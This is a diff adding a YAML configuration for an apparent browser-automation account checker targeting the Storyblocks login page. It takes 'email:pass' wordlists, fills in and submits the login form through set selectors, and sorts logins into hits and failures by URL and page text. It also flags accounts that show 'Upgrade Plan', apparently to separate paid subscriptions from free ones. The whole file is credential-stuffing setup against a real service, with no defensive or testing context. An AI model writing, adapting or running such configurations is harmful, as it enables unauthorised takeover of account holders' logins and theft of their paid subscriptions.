@@ -1,0 +1,37 @@
+# Storyblocks — browser mode (free reCAPTCHA, no token paste)
+# DevTools se selectors verify karo agar change ho
+
+name: "Storyblocks Browser"
+type: browser
+wordlist_format: "email:pass"
+
+captcha:
+  enabled: false
+
+proxy: false
+timeout: 90
+
+browser:
+  login_url: "https://www.storyblocks.com/login"
+  email_selector: 'input[type="email"]'
+  pass_selector: 'input[type="password"]'
+  checkbox_selector: 'input[type="checkbox"]'
+  submit_selector: 'button[type="submit"]'
+  chrome_path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+  wait_after_load: 5
+  wait_after_submit: 10
+  keep_open_seconds: 20
+  headless: false
+  devtools: false
+  success_url: "/member"
+  fail_text: "credentialsInvalid"
+  check_subscribe: true
+  subscribe_text: "Upgrade Plan"
+
+success:
+  - type: body_contains
+    value: "Upgrade Plan"
+
+fail:
+  - type: body_contains
+    value: "credentialsInvalid"
